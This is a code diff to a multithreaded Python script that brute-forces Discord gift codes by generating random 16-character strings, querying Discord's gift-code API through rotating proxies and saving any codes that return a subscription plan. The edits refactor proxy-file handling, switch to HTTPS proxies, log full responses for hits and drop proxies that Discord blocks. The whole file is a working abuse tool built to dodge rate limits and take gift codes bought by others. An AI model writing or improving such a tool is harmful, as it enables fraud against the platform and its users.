@@ -22,19 +22,23 @@ def generateCode():
     return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(16))
 
 
+def saveProxyList(list):
+    f = open('proxies/proxies.txt', 'w+')
+    to_write = ''
+    for proxy in list:
+        to_write += proxy + '\n'
+    to_write = to_write[:-1]
+    f.write(to_write)
+    f.close()
+
+
 def initProxyList():
     global proxies
     proxies = [line.rstrip('\n') for line in open('proxies/proxies.txt')]
     # remove duplicates
     proxies = list(set(proxies))
-    f = open('proxies/proxies.txt', 'w+')
-    to_write = ''
-    for proxy in proxies:
-        to_write += proxy + '\n'
-    to_write = to_write[:-1]
-    f.write(to_write)
-    f.close()
- 
+    saveProxyList(proxies)
+
 
 def getProxy():
     global proxies
@@ -48,21 +52,13 @@ def flagInvalidProxy(proxy):
         invalid_proxies = invalid_proxies + 1
     else:
         pass
-    
-    # delete from file too
-    with open("proxies/proxies.txt", "r+") as f:
-        data = f.readlines()
-        f.seek(0)
-        for i in data:
-            if i != proxy + "\n":
-                f.write(i)
-        f.truncate()
-    
+
     # save 4 later tho, rate limit might expire
     file = open("proxies/flagged_proxies.txt", "a")
     file.write(proxy + "\n")
     file.close()
-    
+
+
 def saveCode(code):
     file = open("codes_found.txt", "a")
     file.write(code + "\n")
@@ -91,7 +87,7 @@ class bruteforceThread(threading.Thread):
 
                 url = 'https://discordapp.com/api/v6/entitlements/gift-codes/' + current_code + '?with_application=false&with_subscription_plan=true'
                 raw_proxy = getProxy()
-                proxy = {'http': 'http://' + raw_proxy}
+                proxy = {'https': 'https://' + raw_proxy}
 
                 s = requests.session()
                 response = s.get(url, proxies=proxy, timeout=timeout, headers={'Connection':'close'})
@@ -99,12 +95,13 @@ class bruteforceThread(threading.Thread):
                 log_msg = "Used proxy: " + raw_proxy + "\n" + "Used code: " + current_code + "\n\n>>>>>>>>>> " + response.text.replace("\n", "\n>>>>>>>>>> ")
                 writeLog(log_msg)
                 if 'subscription_plan' in response.text:
-                    saveCode(current_code)
-                elif 'Access denied' in response.text:# or 'rate limited' in response.text:
+                    #saveCode(current_code)
+                    saveCode(log_msg)
+                elif 'Access denied' in response.text: # or 'rate limited' in response.text:
                     flagInvalidProxy(raw_proxy)
                 else:
                     codes_tried += 1
-                    #time.sleep(random.uniform(0.05, 0.5))
+                    random.uniform(0.5, 3.5)
             except ProxyError:
                 pass
             except SSLError:
@@ -143,4 +140,5 @@ while True:
         print(info)
         time.sleep(0.5)
     except KeyboardInterrupt:
+        saveProxyList(proxies)
         exit(0)
